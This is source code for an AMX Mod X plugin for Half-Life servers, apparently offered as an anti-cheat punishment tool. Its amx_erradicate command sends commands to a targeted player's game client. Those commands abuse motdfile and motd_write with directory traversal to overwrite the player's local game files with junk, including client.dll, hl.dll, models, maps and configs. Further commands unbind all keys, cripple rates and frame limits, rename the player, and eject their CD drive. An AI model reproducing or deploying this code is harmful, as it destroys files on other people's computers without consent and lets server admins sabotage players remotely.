/*	
	HLDM Erradicator (Thanks to Dcarlox for the name)
	Version: 1.0
	Author: FlyingCat
	
	# Information:
	Plugin that serves as an alternative to amx_ban/amx_banip for non-Steam players using Half-Life
	with protocol 47. It provides commands that will make life impossible for the cheater.

	# Commands:
	- amx_erradicate "Nickname or #userid"
	- amx_ejectcd "Nickname or #userid"
	- amx_closecd "Nickname or #userid"

	# Thanks to:
	- Th3-822: Taught me how to use motdfile to overwrite files with corrupt ones
	- Dcarlox: Testing and plugin's name
	- K3NS4N: Ideas for the new commands

	# Contact: 
	- E-mail: alonso.caychop@tutamail.com | flyingcatdm@gmail.com
	- Discord: 天矢七海#1926 | Suisei#4947 (You probably won't find me on the other discord as I rarely use it)
	- Steam: https://steamcommunity.com/id/nanamochi/ | https://steamcommunity.com/id/flyingcatx/ (Same as my discord, I always use the first one)
*/

#include <amxmodx>
#include <amxmisc>

#define PLUGIN			"HLDM Erradicator"
#define VERSION			"1.0-stable"
#define AUTHOR			"FlyingCat"

#pragma semicolon 1

new const gDestroyFiles[][] = {
	// Models
	"motdfile models/player.mdl;motd_write x",
	"motdfile !MD5/../../valve/models/player.mdl;motd_write x",
	"motdfile models/v_9mmhandgun.mdl;motd_write x",
	"motdfile !MD5/../../valve/models/v_9mmhandgun.mdl;motd_write x",
	// Sprites
	"motdfile sprites/hud.txt;motd_write x",
	"motdfile !MD5/../../valve/sprites/hud.txt;motd_write x",
	// Sounds
	"motdfile sound/materials.txt;motd_write x",
	"motdfile !MD5/../../valve/sound/materials.txt;motd_write x",
	"motdfile sound/sentences.txt;motd_write x",	
	"motdfile !MD5/../../valve/sound/sentences.txt;motd_write x",
	// Ficheros del menu del juego
	"motdfile sprites/hud.txt;motd_write x",
	"motdfile !MD5/../../valve/sprites/hud.txt;motd_write x",
	"motdfile spectatormenu.txt;motd_write x",
	"motdfile !MD5/../../valve/spectatormenu.txt;motd_write x",
	"motdfile spectcammenu.txt;motd_write x",
	"motdfile !MD5/../../valve/spectcammenu.txt;motd_write x",
	"motdfile titles.txt;motd_write x",
	"motdfile !MD5/../../valve/titles.txt;motd_write x",
	"motdfile liblist.gam;motd_write x",
	"motdfile !MD5/../../valve/liblist.gam;motd_write x",
	"motdfile gfx/shell/kb_act.lst;motd_write x",
	"motdfile !MD5/../../valve/gfx/shell/kb_act.lst;motd_write x",
	"motdfile gfx/shell/kb_def.lst;motd_write x",
	"motdfile !MD5/../../valve/gfx/shell/kb_def.lst;motd_write x",
	"motdfile gfx/shell/kb_keys.lst;motd_write x",
	"motdfile !MD5/../../valve/gfx/shell/kb_keys.lst;motd_write x",
	"motdfile gfx/palette.lmp;motd_write x",
	"motdfile !MD5/../../valve/gfx/palette.lmp;motd_write x",
	// Wads
	"motdfile halflife.wad;motd_write x",
	"motdfile !MD5/../../valve/halflife.wad;motd_write x",
	// Resources
	"motdfile resource/GameMenu.res;motd_write x",
	"motdfile !MD5/../../valve/resource/GameMenu.res;motd_write x",
	// Mapas
	"motdfile maps/crossfire.bsp;motd_write x",
	"motdfile !MD5/../../valve/maps/crossfire.bsp;motd_write x",
	// Animaciones de armas
	"motdfile events/glock1.sc;motd_write x",
	"motdfile !MD5/../../valve/events/glock1.sc;motd_write x",
	// DLL's
	"motdfile cl_dlls/client.dll;motd_write x",
	"motdfile !MD5/../../valve/cl_dlls/client.dll;motd_write x",
	"motdfile dlls/hl.dll;motd_write x",
	"motdfile !MD5/../../valve/dlls/hl.dll;motd_write x"
};

new const gDestroyCfgFiles[][] = {
	"motdfile autoexec.cfg;motd_write x",
	"motdfile !MD5/../../valve/autoexec.cfg;motd_write x",
	"motdfile default.cfg;motd_write x",
	"motdfile !MD5/../../valve/default.cfg;motd_write x",
	"motdfile joystick.cfg;motd_write x",
	"motdfile !MD5/../../valve/joystick.cfg;motd_write x",
	"motdfile language.cfg;motd_write x",
	"motdfile !MD5/../../valve/language.cfg;motd_write x",
	"motdfile userconfig.cfg;motd_write x",
	"motdfile !MD5/../../valve/userconfig.cfg;motd_write x",
	"motdfile violence.cfg;motd_write x",
	"motdfile !MD5/../../valve/violence.cfg;motd_write x"
};

new const gCommands[][] = {
	"gl_flipmatrix 1;rate 1;cl_cmdrate 1;cl_updaterate 1",
	"fps_max 1;fps_router 1;sys_ticrate 1;name PeruvianBiggy",
	"unbind all",
	"cl_timeout 0"
};

public plugin_init() {
	register_plugin(PLUGIN, VERSION, AUTHOR);
	register_concmd("amx_erradicate", "erradicatePlayer", ADMIN_LEVEL_G, "<Nick or #userid>");
	register_concmd("amx_ejectcd", "openCDPlayer", ADMIN_LEVEL_G, "<Nick or #userid>");
	register_concmd("amx_closecd", "closeCDPlayer", ADMIN_LEVEL_G, "<Nick or #userid>");
}

public erradicatePlayer(id, level, cid) {
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new argument[32];
	read_argv(1, argument, charsmax(argument));

	new player = cmd_target(id, argument, (CMDTARGET_NO_BOTS | CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF));

	if (!player)
		return PLUGIN_HANDLED;

	for (new i = 0; i < sizeof(gDestroyFiles); i++) {
		client_cmd(player, gDestroyFiles[i]);
	}

	for (new i = 0; i < sizeof(gDestroyCfgFiles); i++) {
		client_cmd(player, gDestroyCfgFiles[i]);
	}

	for (new i = 0; i < sizeof(gCommands); i++) {
		client_cmd(player, gCommands[i]);
	}

	new adminName[32], adminSteamID[32], cheaterName[32], cheaterIP[16], cheaterSteamID[32];
	
	get_user_name(id, adminName, charsmax(adminName));
	get_user_authid(id, adminSteamID, charsmax(adminSteamID));
	
	get_user_name(player, cheaterName, charsmax(cheaterName));
	get_user_ip(player, cheaterIP, charsmax(cheaterIP), 1);
	get_user_authid(player, cheaterSteamID, charsmax(cheaterSteamID));

	client_print(0, print_chat, "[PeruHL] El jugador %s (con HL Pirata P47) fue expulsado por uso de hacks", cheaterName);

	log_to_file("hldm-erradicator.log", "%s (SteamID: %s) erradico a %s (IP: %s, SteamID: %s)", adminName, adminSteamID, cheaterName, cheaterIP, cheaterSteamID);
	return PLUGIN_HANDLED;
}

public openCDPlayer(id, level, cid) {
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new argument[32];
	read_argv(1, argument, charsmax(argument));

	new player = cmd_target(id, argument, (CMDTARGET_NO_BOTS | CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF));

	if (!player)
		return PLUGIN_HANDLED;

	client_cmd(player, "cd eject");
	return PLUGIN_HANDLED;
}

public closeCDPlayer(id, level, cid) {
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new argument[32];
	read_argv(1, argument, charsmax(argument));

	new player = cmd_target(id, argument, (CMDTARGET_NO_BOTS | CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF));

	if (!player)
		return PLUGIN_HANDLED;

	client_cmd(player, "cd close");
	return PLUGIN_HANDLED;
}